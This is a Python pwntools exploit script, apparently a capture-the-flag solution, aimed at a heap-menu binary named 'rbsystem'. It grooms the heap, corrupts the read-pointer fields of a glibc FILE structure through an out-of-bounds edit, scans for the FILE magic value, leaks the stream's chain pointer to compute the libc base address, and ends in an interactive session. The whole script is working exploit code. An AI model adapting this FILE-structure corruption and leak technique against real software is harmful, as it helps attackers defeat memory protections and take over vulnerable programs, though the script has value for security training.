#!/usr/bin/env python3
from pwn import *


def prompt(tube, choice):
    tube.recvuntil(b'Your choice: ')
    tube.sendline(str(choice))


def allocate(tube, index, size=0x1000):
    prompt(tube, 1)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def edit(tube, index, offset, size):
    prompt(tube, 2)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Offset: ')
    tube.sendline(str(offset))
    tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def show(tube, index):
    prompt(tube, 3)
    tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    tube.recvuntil(b'Content: ')
    suffix = b'\n1. allocate\n'
    data = tube.recvuntil(suffix)
    return data[:-len(suffix)]


def open_file(tube):
    prompt(tube, 4)


NASTY_INDEX = 15
NASTY_DELTA = 0x55dd9ed71580 - 0x55dd9ed71350
OFFSETOF_IO_READ_PTR = 8
OFFSETOF_IO_READ_END = 16
OFFSETOF_CHAIN = 104


def setup_heap(tube):
    """Heap layout: | 1k x 15 | FILE | 1k | _IO_read_base (1k) |"""
    for i in range(NASTY_INDEX):
        allocate(tube, i)
    open_file(tube)
    allocate(tube, NASTY_INDEX)


def overwrite_field(tube, offset, size):
    edit(tube, NASTY_INDEX, offset - NASTY_DELTA, size)


def rewind_to_file(tube):
    for _ in range(0x10000 // 8):
        edit(tube, NASTY_INDEX, 0, 8)  # read qword
        leak = show(tube, NASTY_INDEX)
        if len(leak) >= 4:
            flags, = struct.unpack('<I', leak[:4])
            if flags == 0xfbad2488:
                return
    raise Exception('Could not find FILE')


def main():
    tube = gdb.debug(['./rbsystem'], gdbscript=r'''
set logging overwrite on
set pagination off
set logging on
b malloc
commands
  python n = int(str(gdb.parse_and_eval('$rdi'))); gdb.execute('finish'); print('malloc(0x{:x}) = 0x{:x}'.format(n, int(str(gdb.parse_and_eval('$rax'))))); gdb.execute('c')
end
c
''')
    setup_heap(tube)
    overwrite_field(tube, OFFSETOF_IO_READ_END, 8)  # allow reading from heap
    edit(tube, NASTY_INDEX, 0, 0x1000)  # skip urandom data
    edit(tube, NASTY_INDEX, 0, 0x1000)  # just in case; now _IO_read_ptr points to 0s
    overwrite_field(tube, OFFSETOF_IO_READ_PTR, 2)  # rewind; now we are somewhere before FILE
    edit(tube, NASTY_INDEX, 0, 6)  # align to qword boundary
    rewind_to_file(tube)
    edit(tube, NASTY_INDEX, 0, OFFSETOF_CHAIN - 8)  # position on chain (we already read flags + hole, hence -8)
    edit(tube, NASTY_INDEX, 0, 8)
    chain, = struct.unpack('<Q', show(tube, NASTY_INDEX).ljust(8, b'\x00'))
    print(f'chain=0x{chain:016x}')
    libc = chain - (0x7f9015d9f680 - 0x7f90159b3000)
    print(f'libc=0x{libc:016x}')
    tube.interactive()


if __name__ == '__main__':
    main()
